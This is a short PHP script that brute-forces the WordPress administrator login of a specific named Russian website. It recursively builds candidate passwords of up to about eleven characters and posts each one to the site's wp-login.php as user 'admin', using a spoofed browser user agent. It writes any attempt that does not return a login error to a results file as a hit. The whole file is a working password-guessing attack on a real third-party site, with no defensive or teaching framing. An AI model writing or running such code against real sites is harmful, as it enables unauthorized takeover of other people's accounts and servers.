<?

/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"https://championat-mira2018.ru/wp-login.php");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 
          http_build_query(array('log' => 'admin', 'pwd' => '123', 'wp-submit' => 'Войти', 'redirect_to' => 'https://championat-mira2018.ru/wp-admin/', 'testcookie' => '1')));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec ($ch);

curl_close ($ch);*/


//$arr = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '@', ',', '.', '?', '!', '/');

rec(''); 

function rec($str) {
	if (strlen($str) > 10) return;
	$arr = array('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '@', ',', '.', '?', '!', '/');
	foreach ($arr as $val) {
		$pwd = $str.$val;
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL,"https://championat-mira2018.ru/wp-login.php");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, 
		          http_build_query(array('log' => 'admin', 'pwd' => $pwd, 'wp-submit' => 'Войти', 'redirect_to' => 'https://championat-mira2018.ru/wp-admin/', 'testcookie' => '1')));

		curl_setopt($ch, CURLOPT_COOKIEJAR, 'amazoncookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'amazoncookie.txt');
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_VERBOSE, true);
		curl_setopt($ch, CURLOPT_STDERR,  fopen('php://stdout', 'w'));
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

		$server_output = curl_exec ($ch);

		curl_close ($ch);

		if (stristr($server_output, "login_error") == false) { file_put_contents('result.txt', $pwd." OK\n", FILE_APPEND); file_put_contents('result2.txt', $server_output); echo $pwd; } 
		else file_put_contents('result.txt', $pwd."\n", FILE_APPEND);
		rec($pwd);
	}
}

?>